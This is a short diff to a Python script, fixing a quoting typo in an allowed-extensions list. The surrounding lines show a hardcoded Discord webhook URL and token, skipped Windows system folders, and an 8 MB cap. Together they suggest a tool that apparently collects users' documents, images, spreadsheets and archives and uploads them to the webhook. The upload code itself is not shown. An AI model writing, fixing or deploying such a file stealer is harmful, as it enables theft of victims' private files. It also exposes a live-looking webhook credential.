@@ -27,7 +27,7 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1182426585836560415/kX7Kgo6CXcFo
 BLACKLISTED_DIRS = ['C:\\Windows\\', 'C:\\$SysReset\\', 'C:\\$WinREAgent\\', 'C:\\OneDriveTemp\\', 'C:\\ProgramData\\', 'C:\\Program Files\\', 'C:\\Program Files (x86)\\', 'C:\\$Recycle.Bin\\','C:\\AMD\\']
 MAX_FILE_SIZE_MB = 8
 def check_file(file_path):
-    allowed_extensions = ['.txt', '.pdf', '.png', '.jpg', '.jpeg', '.gif', '.mp4', '.mp3', '.py', '.js', '.mkv', '.docx', '.xls', '.xlsx', '.docx', '.wav, '.xlsm', '.zip', '.mpeg', '.csv']
+    allowed_extensions = ['.txt', '.pdf', '.png', '.jpg', '.jpeg', '.gif', '.mp4', '.mp3', '.py', '.js', '.mkv', '.docx', '.xls', '.xlsx', '.docx', '.wav', '.xlsm', '.zip', '.mpeg', '.csv']
     max_size_mb = 8
     if os.path.splitext(file_path)[1].lower() not in allowed_extensions:
         print(f"Skipping file {file_path} - invalid file type")
